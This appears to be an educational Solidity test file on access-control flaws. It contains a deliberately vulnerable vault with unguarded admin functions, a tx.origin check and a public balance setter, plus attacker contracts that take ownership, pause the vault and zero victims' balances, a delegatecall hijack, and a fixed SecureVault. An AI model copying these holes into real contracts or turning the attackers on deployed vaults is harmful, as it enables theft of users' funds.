// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Access Control Vulnerable Contract
 * @notice DELIBERATELY VULNERABLE - For testing purposes only
 *
 * Vulnerability: Missing access control modifiers
 * Impact: Anyone can call admin-only functions
 * CWE: CWE-284 (Improper Access Control)
 *
 * Common Issues:
 * - tx.origin instead of msg.sender
 * - Missing onlyOwner modifiers
 * - Incorrect visibility (public instead of private/internal)
 * - Uninitialized ownership
 */

/**
 * @title Vulnerable Vault with Access Control Issues
 */
contract VulnerableVault {
    address public owner;
    mapping(address => uint256) public balances;
    bool public paused;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice Deposit ETH
     */
    function deposit() external payable {
        require(!paused, "Contract paused");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice Withdraw ETH
     */
    function withdraw(uint256 amount) external {
        require(!paused, "Contract paused");
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);

        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @notice VULNERABILITY 1: Missing access control
     * @dev Anyone can pause the contract!
     */
    function pause() external {
        paused = true;
    }

    /**
     * @notice VULNERABILITY 2: Missing access control
     * @dev Anyone can unpause the contract!
     */
    function unpause() external {
        paused = false;
    }

    /**
     * @notice VULNERABILITY 3: Uses tx.origin instead of msg.sender
     * @dev Vulnerable to phishing attacks
     */
    function emergencyWithdraw() external {
        require(tx.origin == owner, "Not owner");
        payable(tx.origin).transfer(address(this).balance);
    }

    /**
     * @notice VULNERABILITY 4: Missing access control
     * @dev Anyone can transfer ownership!
     */
    function transferOwnership(address newOwner) external {
        require(newOwner != address(0), "Invalid address");
        address previousOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(previousOwner, newOwner);
    }

    /**
     * @notice VULNERABILITY 5: Public function that should be internal
     * @dev Anyone can call this critical internal function
     */
    function updateBalance(address user, uint256 newBalance) public {
        balances[user] = newBalance;
    }
}

/**
 * @title Phishing Attack Contract
 * @notice Exploits tx.origin vulnerability
 */
contract PhishingAttacker {
    VulnerableVault public vault;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    /**
     * @notice Trick owner into calling this
     * @dev When owner calls this, tx.origin is owner, so emergencyWithdraw succeeds
     */
    function innocentLookingFunction() external {
        // Owner thinks they're calling something safe
        // But we call emergencyWithdraw which uses tx.origin
        vault.emergencyWithdraw();

        // Funds go to owner (tx.origin) but we intercepted the call
        // In real attack, we'd have additional logic to steal funds
    }

    receive() external payable {}
}

/**
 * @title Access Control Attacker
 * @notice Exploits missing access control modifiers
 */
contract AccessControlAttacker {
    VulnerableVault public vault;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    /**
     * @notice Attack 1: Take ownership
     */
    function takeOwnership() external {
        vault.transferOwnership(address(this));
    }

    /**
     * @notice Attack 2: Pause contract (DoS)
     */
    function dosAttack() external {
        vault.pause();
        // Contract is now paused, nobody can deposit or withdraw
    }

    /**
     * @notice Attack 3: Manipulate balances
     */
    function manipulateBalance(address victim) external {
        // Set victim's balance to 0
        vault.updateBalance(victim, 0);

        // Set our balance to max
        vault.updateBalance(address(this), type(uint256).max);
    }
}

/**
 * @title Secure Vault with Proper Access Control
 * @notice Fixed version using OpenZeppelin patterns
 */
contract SecureVault {
    address public owner;
    mapping(address => uint256) public balances;
    bool public paused;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Paused(address account);
    event Unpaused(address account);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Contract paused");
        _;
    }

    modifier whenPaused() {
        require(paused, "Contract not paused");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable whenNotPaused {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external whenNotPaused {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);

        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @notice FIXED: Only owner can pause
     */
    function pause() external onlyOwner whenNotPaused {
        paused = true;
        emit Paused(msg.sender);
    }

    /**
     * @notice FIXED: Only owner can unpause
     */
    function unpause() external onlyOwner whenPaused {
        paused = false;
        emit Unpaused(msg.sender);
    }

    /**
     * @notice FIXED: Uses msg.sender instead of tx.origin
     */
    function emergencyWithdraw() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    /**
     * @notice FIXED: Only owner can transfer ownership
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        address previousOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(previousOwner, newOwner);
    }

    /**
     * @notice FIXED: Internal function cannot be called externally
     */
    function _updateBalance(address user, uint256 newBalance) internal {
        balances[user] = newBalance;
    }
}

/**
 * @title Uninitialized Storage Vulnerability
 * @notice VULNERABLE: Ownership can be claimed by anyone
 */
contract UninitializedOwner {
    address public owner;

    /**
     * @notice VULNERABILITY: Owner not set in constructor
     * @dev First person to call initialize() becomes owner
     */
    function initialize() external {
        require(owner == address(0), "Already initialized");
        owner = msg.sender;
    }

    function adminFunction() external {
        require(msg.sender == owner, "Not owner");
        // Do admin things
    }
}

/**
 * @title Delegate Call Vulnerability
 * @notice VULNERABLE: Delegatecall to untrusted address
 */
contract DelegateCallVulnerable {
    address public owner;
    uint256 public value;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice VULNERABILITY: Allows delegatecall to any address
     * @dev Attacker can change storage variables including owner
     */
    function delegateCall(address target, bytes memory data) external {
        (bool success, ) = target.delegatecall(data);
        require(success, "Delegatecall failed");
    }
}

/**
 * @title Malicious Contract for Delegatecall Attack
 */
contract MaliciousDelegateTarget {
    address public owner;  // Same storage slot as DelegateCallVulnerable
    uint256 public value;

    /**
     * @notice Changes owner in the calling contract
     */
    function pwn() external {
        owner = msg.sender;
    }
}
